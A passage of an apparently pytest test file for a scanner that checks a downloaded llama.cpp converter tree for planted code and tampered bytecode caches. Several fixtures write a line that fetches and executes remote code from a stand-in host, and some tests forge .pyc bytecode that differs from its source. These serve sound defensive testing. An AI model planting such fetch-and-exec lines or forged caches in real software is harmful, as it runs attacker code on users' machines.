    assert len(seen) == len(set(seen)), sorted(seen)


def test_scan_plan_discovery_is_bounded_before_it_reads_anything(tmp_path, monkeypatch):
    """The plan is built from an unverified tree, so discovery needs its own budget: materializing a
    very wide root before limiting it would exhaust memory first."""
    llama_cpp = _load("llama_cpp_discovery_bound_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    handed_out = {"count": 0}
    real_scandir = os.scandir

    class _Endless:
        """A directory that never stops yielding entries."""

        def __init__(self, path):
            self.path = path

        def __enter__(self):
            return self

        def __exit__(self, *_):
            return False

        def __iter__(self):
            while True:
                handed_out["count"] += 1
                if handed_out["count"] > llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES * 4:
                    raise AssertionError(
                        "discovery kept asking for entries past its budget"
                    )
                yield _FakeEntry(os.path.join(self.path, f"e{handed_out['count']}"))

    class _FakeEntry:
        def __init__(self, path):
            self.path = path
            self.name = os.path.basename(path)

        def is_dir(self):
            return False

    def _fake_scandir(path):
        if os.path.realpath(path) == os.path.realpath(str(root)):
            return _Endless(str(root))
        return real_scandir(path)

    monkeypatch.setattr(llama_cpp.os, "scandir", _fake_scandir)
    plan = llama_cpp._scanned_locations(str(root))
    assert plan.truncated is True, "a root this wide has to be reported, not walked"
    assert handed_out["count"] <= llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES * 4


def test_a_directory_admitted_late_can_still_reach_an_earlier_one(tmp_path):
    """The closure grows during the walk, so one pass is not enough: a late-admitted directory can
    import a name already passed over, and nothing would revisit it."""
    llama_cpp = _load("llama_cpp_fixpoint_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    # "aaa" sorts before "zzz", so a single pass sees it first and skips it.
    (root / "aaa").mkdir()
    (root / "aaa" / "mod.py").write_text("X = 1\n", encoding = "utf-8")
    (root / "zzz").mkdir()
    (root / "zzz" / "__init__.py").write_text("import aaa\n", encoding = "utf-8")
    _converter_imports(root, "zzz")

    labels = {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }
    assert {"zzz", "aaa"} <= labels, sorted(labels)


def test_a_from_import_counts_as_reaching_the_directory(tmp_path):
    """A `from shadow import payload` must count as reaching the shadow directory."""
    llama_cpp = _load("llama_cpp_from_import_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "shadow").mkdir()
    base = root / "conversion" / "base.py"
    base.write_text(
        "from shadow import payload\n" + base.read_text(encoding = "utf-8"),
        encoding = "utf-8",
    )

    assert "shadow" in {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }


def test_a_converter_this_cannot_parse_is_scanned_as_widely_as_before(tmp_path):
    """Narrowing follows imports, so an unparseable checkout must widen back to the full scan rather
    than narrow to nothing; a syntax error must not pick what is scanned."""
    llama_cpp = _load("llama_cpp_unparseable_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "anything").mkdir()
    for name in ("__init__.py", "base.py"):
        (root / "conversion" / name).write_text("def (\n", encoding = "utf-8")

    labels = {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }
    assert "anything" in labels, sorted(labels)


def _converter_imports(root, *names):
    """Makes the converter's own sources import these names, since a directory is scanned when
    something it runs imports it; written into conversion/base.py."""
    base = root / "conversion" / "base.py"
    body = "".join(f"import {name}\n" for name in names)
    base.write_text(body + base.read_text(encoding = "utf-8"), encoding = "utf-8")


def test_each_root_directory_is_its_own_bounded_location(tmp_path, monkeypatch):
    """Each directory the converter imports is its own bounded location, including one without
    __init__.py, since from-imports run submodules; root stays non-recursive."""
    llama_cpp = _load("llama_cpp_shadow_scope_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    for name in ("ggml", "examples", "tools"):
        big = root / name / "deep" / "deeper"
        big.mkdir(parents = True)
        (big / "buried.py").write_text("VALUE = 1\n", encoding = "utf-8")
    _converter_imports(root, "ggml", "examples", "tools")

    locations = llama_cpp._scanned_locations(str(root)).locations
    by_label = {location.label: location for location in locations}
    assert set(by_label) == {"conversion", ".", "ggml", "examples", "tools"}, sorted(by_label)
    # The root walks its own files only; everything else is reached as itself.
    assert by_label["."].recursive is False
    assert by_label["ggml"].recursive is True
    # Natives count as modules only where an extension module would really live.
    assert by_label["conversion"].natives is True
    assert by_label["."].natives is False and by_label["ggml"].natives is False


def test_a_payload_in_a_root_namespace_package_is_scanned(tmp_path, monkeypatch):
    """The submodule is what executes, and it was not being read."""
    llama_cpp = _load("llama_cpp_namespace_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    shadow = root / "shadow"
    shadow.mkdir()
    _converter_imports(root, "shadow")
    assert not (shadow / "__init__.py").exists(), "a namespace package, deliberately"
    (shadow / "payload.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_prebuilt_bundles_own_libraries_are_not_a_finding(tmp_path, monkeypatch, caplog):
    """Prebuilt .so/.dylib/.dll libraries copied beside llama.cpp are not opaque Python modules;
    flagging them warned on every install and refused strict exports."""
    llama_cpp = _load("llama_cpp_bundle_libs_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    for name in ("libggml.so", "libllama.so", "libmtmd.dylib"):
        (root / name).write_bytes(b"\x7fELF")
    rocm = root / "hipblaslt"
    rocm.mkdir()
    (rocm / "libhipblaslt.so").write_bytes(b"\x7fELF")

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))      # must not raise
    assert caplog.records == [], [r.message for r in caplog.records]

    # Inside a package the converter imports by name, a native file still is one.
    (root / "conversion" / "fast.so").write_bytes(b"\x7fELF")
    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
        llama_cpp._scan_conversion_package(str(root))


def test_a_pinned_converters_sibling_packages_are_still_scanned(tmp_path, monkeypatch, caplog):
    """A pin waives only the entrypoint's refusal; its sibling conversion/ packages must still be
    scanned and warned about, not skipped outright."""
    llama_cpp = _load("llama_cpp_pinned_sibling_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "conversion" / "payload.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        # Reported, and NOT refused: the pin is the user's own choice of file.
        llama_cpp._scan_conversion_package(str(root), is_local_copy = True)
    assert caplog.records, "a pinned checkout's siblings were scanned silently"

    # The same tree unpinned still refuses under strict mode.
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root), is_local_copy = False)


def test_a_pinned_checkout_is_reported_but_never_rewritten(tmp_path, monkeypatch):
    """A pinned checkout is reported, never rewritten: someone works in it and has caches."""
    llama_cpp = _load("llama_cpp_pinned_purge_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    cache = root / "conversion" / "__pycache__"
    cache.mkdir()
    theirs = cache / "base.cpython-313.pyc"
    theirs.write_bytes(_pyc(0))

    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    assert llama_cpp._purge_imported_package_bytecode(
        str(root), is_local_copy = True,
    ) == ()
    assert theirs.exists(), "a pinned checkout was rewritten"

    # Downloaded bytes get no such deference.
    llama_cpp._purge_imported_package_bytecode(str(root), is_local_copy = False)
    assert not theirs.exists()


def test_the_key_ignores_the_converter_this_module_writes(tmp_path, monkeypatch):
    """The patched converter in the root is this scan's own output, so keying on it made each miss
    rewrite it and miss again; with scanning disabled, every export re-patched it."""
    llama_cpp = _load("llama_cpp_generated_key_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    generated = root / llama_cpp.GENERATED_CONVERTER_NAME
    generated.write_text("# patched\n", encoding = "utf-8")

    for disabled in ("1", ""):
        if disabled:
            monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", disabled)
        else:
            monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)

        before = llama_cpp._conversion_sibling_info(str(root))
        # Rewritten exactly as the patcher rewrites it, on every cache miss.
        generated.write_text("# patched\n", encoding = "utf-8")
        os.utime(generated, ns = (0, 0))
        assert llama_cpp._conversion_sibling_info(str(root)) == before, (
            f"the generated converter moved the key (disabled={disabled!r})"
        )

    # And a real root module still moves it, so the exclusion is not a blanket one.
    (root / "gguf.py").write_text("WHO = 'shadow'\n", encoding = "utf-8")
    assert llama_cpp._conversion_sibling_info(str(root)) != before


def test_the_number_of_scan_locations_is_bounded(tmp_path):
    """Each root directory became a scan location with its own entry allowance and nothing capped
    their number, so a wide root multiplied the budget."""
    llama_cpp = _load("llama_cpp_location_bound_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    for index in range(llama_cpp.MAX_SCAN_LOCATIONS * 3):
        (root / f"dir_{index:04d}").mkdir()
    _converter_imports(
        root, *(f"dir_{index:04d}" for index in range(llama_cpp.MAX_SCAN_LOCATIONS * 3))
    )

    plan = llama_cpp._scanned_locations(str(root))
    assert len(plan.locations) <= llama_cpp.MAX_SCAN_LOCATIONS, len(plan.locations)
    assert plan.truncated is True, "dropping directories has to be reported"


def test_a_module_merely_named_like_the_generated_one_is_still_scanned(
    tmp_path, monkeypatch
):
    """Only the exact generated converter file, and only where this module writes it, is excluded; a
    module merely named like it must still be scanned."""
    llama_cpp = _load("llama_cpp_generated_exact_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    stem = llama_cpp.GENERATED_CONVERTER_NAME[: -len(".py")]
    lookalike = root / "conversion" / f"{stem}_payload.py"
    lookalike.write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))

    # A file by the same name one directory down is not the generated one either.
    (root / "conversion" / llama_cpp.GENERATED_CONVERTER_NAME).write_text(
        "import requests\nexec(requests.get('http://example.invalid/q').text)\n",
        encoding = "utf-8",
    )
    lookalike.unlink()
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_dropping_directories_past_the_cap_is_reported(tmp_path, monkeypatch, caplog):
    """Directories dropped past MAX_SCAN_LOCATIONS must be reported: a root reaching the cap stays
    far under the 4096-entry budget that would otherwise have spoken, so the payload went
    unscanned in silence."""
    llama_cpp = _load("llama_cpp_location_cap_report_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    for index in range(llama_cpp.MAX_SCAN_LOCATIONS + 5):
        (root / f"dir_{index:04d}").mkdir()
    _converter_imports(
        root, *(f"dir_{index:04d}" for index in range(llama_cpp.MAX_SCAN_LOCATIONS + 5))
    )

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    assert any("directories this scan" in r.message for r in caplog.records), (
        [r.message for r in caplog.records]
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError, match = "directories this scan"):
        llama_cpp._scan_conversion_package(str(root))


def test_the_sibling_scan_does_not_rewrite_a_pinned_checkout(tmp_path, monkeypatch):
    """The sibling scan must not purge caches in a pinned checkout that the outer purge already
    declined to touch."""
    llama_cpp = _load("llama_cpp_pinned_inner_purge_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    cache = root / "conversion" / "__pycache__"
    cache.mkdir()
    theirs = cache / "base.cpython-313.pyc"
    theirs.write_bytes(_pyc(0))

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    llama_cpp._scan_conversion_package(str(root), is_local_copy = True)
    assert theirs.exists(), "the sibling scan rewrote a checkout the user pinned"

    llama_cpp._scan_conversion_package(str(root), is_local_copy = False)
    assert not theirs.exists()


def test_the_roots_own_bytecode_cache_is_not_skipped(tmp_path, monkeypatch):
    """The root's own __pycache__ is part of the root, not a skipped subtree: CPython runs a cache
    beside a clean gguf.py in place of the scanned source, so it must be purged."""
    llama_cpp = _load("llama_cpp_root_cache_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "gguf.py").write_text("WHO = 'clean'\n", encoding = "utf-8")
    cache = root / "__pycache__"
    cache.mkdir()
    planted = cache / "gguf.cpython-313.pyc"
    planted.write_bytes(_pyc(0))

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    assert llama_cpp._purge_imported_package_bytecode(str(root)) == ()
    assert not planted.exists(), "the root's own cache was never reached"

    # A sourceless .pyc inside __pycache__ is not importable (CPython loads sourceless caches only
    # from the legacy path), so it is not a finding and must not refuse an export.
    orphan = cache / "nosource.cpython-313.pyc"
    orphan.write_bytes(_pyc(0))
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    llama_cpp._scan_conversion_package(str(root))
    assert orphan.exists()

    # The legacy layout is importable, and is still reported.
    legacy = root / "nosource.pyc"
    legacy.write_bytes(_pyc(0))
    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
        llama_cpp._scan_conversion_package(str(root))
    assert legacy.exists()


@pytest.mark.parametrize(
    "extra, truncated",
    [(-1, False), (0, False), (1, True)],
    ids = ["one under the cap", "exactly at the cap", "one over it"],
)
def test_truncation_is_declared_only_when_something_was_dropped(
    tmp_path, monkeypatch, extra, truncated
):
    """Truncation is declared only when something was dropped: stopping AT the location cap flagged
    a root of exactly that size, while the file and entry budgets ask for one more than they
    keep."""
    llama_cpp = _load(f"llama_cpp_cap_edge_probe_{extra}", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    # conversion/ and "." are locations too, so the directories are the rest.
    plan_without = llama_cpp._scanned_locations(str(root))
    already = len(plan_without.locations)
    wanted = llama_cpp.MAX_SCAN_LOCATIONS - already + extra
    for index in range(max(wanted, 0)):
        (root / f"dir_{index:04d}").mkdir()
    _converter_imports(root, *(f"dir_{index:04d}" for index in range(max(wanted, 0))))

    plan = llama_cpp._scanned_locations(str(root))
    assert plan.truncated is truncated, (
        f"{len(plan.locations)} locations, cap {llama_cpp.MAX_SCAN_LOCATIONS}"
    )
    assert len(plan.locations) <= llama_cpp.MAX_SCAN_LOCATIONS

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    if truncated:
        with pytest.raises(llama_cpp.ConverterScanError, match = "directories this scan"):
            llama_cpp._scan_conversion_package(str(root))
    else:
        llama_cpp._scan_conversion_package(str(root))      # must not raise


def test_a_payload_directly_under_gguf_py_is_scanned(tmp_path, monkeypatch):
    """The entrypoint puts gguf-py itself on sys.path, so a payload directly under gguf-py is
    importable by its own name and must be scanned, not only the gguf subpackage."""
    llama_cpp = _load("llama_cpp_gguf_root_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    gguf_py = root / "gguf-py"
    (gguf_py / "gguf").mkdir(parents = True)
    (gguf_py / "gguf" / "__init__.py").write_text("import payload\n", encoding = "utf-8")
    (gguf_py / "payload.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_gguf_py_is_planned_as_an_import_root_and_walked_once(tmp_path):
    """gguf-py is an import root, walked once on its own and not as a child of llama.cpp root."""
    llama_cpp = _load("llama_cpp_gguf_plan_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    gguf_py = root / "gguf-py"
    for child in ("gguf", "tests", "examples"):
        (gguf_py / child).mkdir(parents = True)
    (gguf_py / "util.py").write_text("X = 1\n", encoding = "utf-8")

    plan = llama_cpp._scanned_locations(str(root))
    by_label = {location.label: location for location in plan.locations}
    assert "gguf-py" in by_label and by_label["gguf-py"].recursive is False
    assert "gguf-py/gguf" in by_label
    # tests/ and examples/ under gguf-py are not scanned: the converter imports neither, and reading
    # them refused exports of an ordinary llama.cpp master clone in strict mode.
    assert "gguf-py/tests" not in by_label and "gguf-py/examples" not in by_label
    # Walked once: not also a recursive child of the llama.cpp root.
    assert [label for label in by_label if label == "gguf-py"] == ["gguf-py"]
    assert by_label["gguf-py"].natives is False
    assert by_label["gguf-py/gguf"].natives is True

    walk = llama_cpp._conversion_package_modules(str(gguf_py), recursive = False)
    assert "util.py" in walk.names


def _real_cache(source_path):
    """Compile a source the way an ordinary run would, and return its cache."""
    py_compile.compile(str(source_path), doraise = True)
    return pathlib.Path(importlib.util.cache_from_source(str(source_path)))


def test_a_pinned_checkouts_bytecode_is_reported_only_when_it_disagrees(
    tmp_path, monkeypatch, caplog
):
    """A pin's cache is left in place and runs instead of its source, so skipping both delete and
    report let tampering run silently; reporting every cache flagged 215 files per export, so
    only a cache whose bytecode differs from what its source compiles to is reported."""
    llama_cpp = _load("llama_cpp_pinned_report_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    source = root / "conversion" / "base.py"
    theirs = _real_cache(source)

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)

    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root), is_local_copy = True)
    assert not [r for r in caplog.records if "cannot read" in r.message], (
        "an ordinary pinned working tree must export in silence: "
        + str([r.message for r in caplog.records])
    )
    assert theirs.exists(), "a pinned checkout must still not be rewritten"

    # A header CPython accepts over bytecode the source never produced: CPython checks the header
    # against the source but never that the code came from it.
    theirs.write_bytes(
        theirs.read_bytes()[:16] + marshal.dumps(
            compile("PWNED = 1\n", str(source), "exec"), marshal.version,
        )
    )
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        # Reported, never refused: strict mode does not block a file the user chose.
        llama_cpp._scan_conversion_package(str(root), is_local_copy = True)
    reported = [r.message for r in caplog.records if "cannot read" in r.message]
    assert reported, [r.message for r in caplog.records]
    assert "base" in reported[0], reported
    assert theirs.exists(), "a pinned checkout must still not be rewritten"

    # Downloaded bytes are purged instead, so there is nothing left to report.
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root), is_local_copy = False)
    assert not theirs.exists()
    assert not [r for r in caplog.records if "cannot read" in r.message]


def test_a_pinned_cache_built_by_another_python_is_not_a_finding(tmp_path):
    """A cache tagged for another Python is not a finding: this interpreter never loads it, and
    comparing it with the source would flag every checkout used with two Pythons."""
    llama_cpp = _load("llama_cpp_foreign_magic_probe", "unsloth_zoo/llama_cpp.py")

    source = tmp_path / "base.py"
    source.write_text("X = 1\n", encoding = "utf-8")
    cache = _real_cache(source)
    # Another CPython's cache: only its magic makes it a non-finding, so its bytecode must differ
    # from this interpreter's compile of the source or the test proves nothing.
    foreign = bytearray(cache.read_bytes())
    foreign[:4] = b"\x00\x00\r\n"
    cache.write_bytes(bytes(foreign[:16]) + marshal.dumps(
        compile("X = 2\n", str(source), "exec"), marshal.version,
    ))

    assert llama_cpp._counts_as_a_module(
        str(cache.parent), cache.name, purged = False,
    ) is False


def test_a_cache_marshalled_without_the_outer_ref_flag_still_matches(tmp_path):
    """marshal sets FLAG_REF on the outer object only when its refcount is above one at dump time,
    so identical code can marshal to different bytes, and raw byte comparison is wrong."""
    llama_cpp = _load("llama_cpp_flag_ref_probe", "unsloth_zoo/llama_cpp.py")

    source = tmp_path / "base.py"
    source.write_text("X = 1\n", encoding = "utf-8")
    cache = _real_cache(source)
    header = cache.read_bytes()[:16]
    # Refcount is one at dump time, so marshal omits FLAG_REF: same code, different bytes.
    unflagged = marshal.dumps(
        compile(source.read_bytes(), str(source), "exec", dont_inherit = True),
        marshal.version,
    )
    assert unflagged != cache.read_bytes()[16:], (
        "this test is only meaningful while the two spellings differ"
    )
    cache.write_bytes(header + unflagged)

    assert llama_cpp._counts_as_a_module(
        str(cache.parent), cache.name, purged = False,
    ) is False


def test_an_unreadable_or_unparseable_pinned_cache_is_reported(tmp_path):
    """Nothing here can say it agrees with its source, and it is still what runs."""
    llama_cpp = _load("llama_cpp_unreadable_cache_probe", "unsloth_zoo/llama_cpp.py")

    source = tmp_path / "base.py"
    source.write_text("X = 1\n", encoding = "utf-8")
    cache = _real_cache(source)
    cache.write_bytes(cache.read_bytes()[:20])   # truncated mid-code

    assert llama_cpp._counts_as_a_module(
        str(cache.parent), cache.name, purged = False,
    ) is True

    source.write_text("def (\n", encoding = "utf-8")   # cannot be compiled to compare
    assert llama_cpp._counts_as_a_module(
        str(cache.parent), cache.name, purged = False,
    ) is True


def test_a_top_level_symlink_does_not_become_its_own_purge_boundary(
    tmp_path, monkeypatch
):
    """Containment is measured from the checkout, not each scan location: a top-level symlink
    promoted to its own location made an outside tree look internal and had its caches deleted."""
    llama_cpp = _load("llama_cpp_top_level_escape_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    outside = tmp_path / "somebody-elses-project"
    (outside / "__pycache__").mkdir(parents = True)
    (outside / "mod.py").write_text("X = 1\n", encoding = "utf-8")
    theirs = outside / "__pycache__" / "mod.cpython-313.pyc"
    theirs.write_bytes(_pyc(0))
    _converter_imports(root, "linked")
    try:
        # A location of its own, unlike a link buried inside conversion/.
        (root / "linked").symlink_to(outside, target_is_directory = True)
    except (OSError, NotImplementedError):
        pytest.skip("this filesystem does not allow creating directory symlinks")
    assert any(
        location.label == "linked"
        for location in llama_cpp._scanned_locations(str(root)).locations
    ), "this test is only meaningful while the link is promoted to a location"

    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    llama_cpp._purge_imported_package_bytecode(str(root))
    assert theirs.exists(), "the purge reached outside the checkout it was given"

    # And through the scan, which purges per location on its own way in.
    llama_cpp._scan_conversion_package(str(root))
    assert theirs.exists(), "the per-location purge reached outside the checkout"


def test_a_conversion_dir_without_base_py_is_still_keyed(tmp_path, monkeypatch):
    """The cache key must cover conversion/ even without base.py, since the scan reads it either
    way; otherwise a changed module kept the key identical and ran unscanned from cache."""
    llama_cpp = _load("llama_cpp_odd_layout_key_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("from . import helper\n", encoding = "utf-8")
    (conversion / "helper.py").write_text("X = 1\n", encoding = "utf-8")
    assert not (conversion / "base.py").exists(), "the point of this layout"
    # Still a scan location, which is what makes the missing key entries a hole.
    assert any(
        location.label == "conversion"
        for location in llama_cpp._scanned_locations(str(root)).locations
    )

    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    before = llama_cpp._conversion_sibling_info(str(root))
    (conversion / "helper.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )
    after = llama_cpp._conversion_sibling_info(str(root))
    assert before != after, (
        "the key did not move when a module in a nonstandard conversion/ changed"
    )


def test_a_pins_bytecode_travels_in_the_patcher_cache_key(tmp_path, monkeypatch):
    """A pin's caches are left in place and run by the converter, so they must be in the patcher
    cache key; left out, a changed cache skipped the scan and ran silently."""
    llama_cpp = _load("llama_cpp_pin_key_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    source = root / "conversion" / "base.py"
    cache = _real_cache(source)

    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    before = llama_cpp._conversion_sibling_info(str(root), is_local_copy = True)
    cache.write_bytes(
        cache.read_bytes()[:16] + marshal.dumps(
            compile("PWNED = 1\n", str(source), "exec", dont_inherit = True),
        )
    )
    after = llama_cpp._conversion_sibling_info(str(root), is_local_copy = True)
    assert before != after, "the key did not move when the pinned cache changed"

    # Downloaded checkouts purge caches first, so keeping them would only churn the key.
    downloaded = llama_cpp._conversion_sibling_info(str(root), is_local_copy = False)
    assert not any(
        ".pyc" in entry[0] for entry in downloaded[1:]
    ), downloaded


def test_the_purge_does_not_follow_a_symlink_out_of_the_tree(tmp_path, monkeypatch):
    """The scan may read through a symlink out of the package, as the converter's import would, but
    the purge must not follow it into an unrelated tree."""
    llama_cpp = _load("llama_cpp_purge_escape_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    outside = tmp_path / "somebody-elses-project"
    (outside / "__pycache__").mkdir(parents = True)
    (outside / "mod.py").write_text("X = 1\n", encoding = "utf-8")
    theirs = outside / "__pycache__" / "mod.cpython-313.pyc"
    theirs.write_bytes(_pyc(0))
    try:
        (root / "conversion" / "linked").symlink_to(outside, target_is_directory = True)
    except (OSError, NotImplementedError):
        pytest.skip("this filesystem does not allow creating directory symlinks")

    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    llama_cpp._purge_imported_package_bytecode(str(root))
    assert theirs.exists(), "the purge reached outside the checkout it was given"

    # The scan still reads through the link, which is the half that must not change.
    (outside / "payload.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def _package_root(tmp_path):
    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("from . import base\n", encoding = "utf-8")
    # The real converter imports gguf and the scan follows imports, so the fixture's base.py imports
    # gguf for a gguf directory beside it to shadow anything.
    (conversion / "base.py").write_text("import gguf\nX = 1\n", encoding = "utf-8")
    return root


def test_a_payload_in_gguf_py_is_scanned_too(tmp_path, monkeypatch):
    """gguf-py comes from the same undigested tarball as conversion/ and the entrypoint imports gguf
    from it, so scanning only conversion/ missed a gguf-py/gguf payload."""
    llama_cpp = _load("llama_cpp_gguf_py_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    gguf = root / "gguf-py" / "gguf"
    gguf.mkdir(parents = True)
    (gguf / "__init__.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_the_cache_key_covers_gguf_py_on_a_monolith_checkout_too(tmp_path):
    """The cache key must cover gguf-py on monolithic checkouts too: with no conversion/ it returned
    None before hashing gguf-py, so a replaced gguf module kept the key; the converter subprocess
    imported it anyway, strict mode included."""
    llama_cpp = _load("llama_cpp_monolith_gguf_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    gguf = root / "gguf-py" / "gguf"
    gguf.mkdir(parents = True)
    module = gguf / "__init__.py"
    module.write_text("VERSION = 1\n", encoding = "utf-8")
    assert not (root / "conversion").exists(), "this is the monolith shape"

    before = llama_cpp._conversion_sibling_info(str(root))
    assert before is not None, "a monolith that ships gguf-py still has something to key on"
    module.write_text("VERSION = 1  # and a payload\n", encoding = "utf-8")
    assert llama_cpp._conversion_sibling_info(str(root)) != before


def test_a_checkout_with_neither_package_keys_on_its_root(tmp_path):
    """Only a checkout with nothing on disk keys to None; one with neither conversion/ nor gguf-py
    is still keyed on its root, the subprocess's sys.path[0] where a shadow could be planted."""
    llama_cpp = _load("llama_cpp_no_package_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    root.mkdir()
    (root / "convert_hf_to_gguf.py").write_text("import gguf\n", encoding = "utf-8")

    assert llama_cpp._conversion_sibling_info(str(root)) is not None
    assert llama_cpp._conversion_sibling_info(str(tmp_path / "absent")) is None


def test_the_cache_key_covers_gguf_py(tmp_path):
    """The cache key must cover gguf-py, or a long-lived process re-imports it unscanned."""
    llama_cpp = _load("llama_cpp_gguf_key_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    gguf = root / "gguf-py" / "gguf"
    gguf.mkdir(parents = True)
    module = gguf / "__init__.py"
    module.write_text("VERSION = 1\n", encoding = "utf-8")

    before = llama_cpp._conversion_sibling_info(str(root))
    assert before is not None
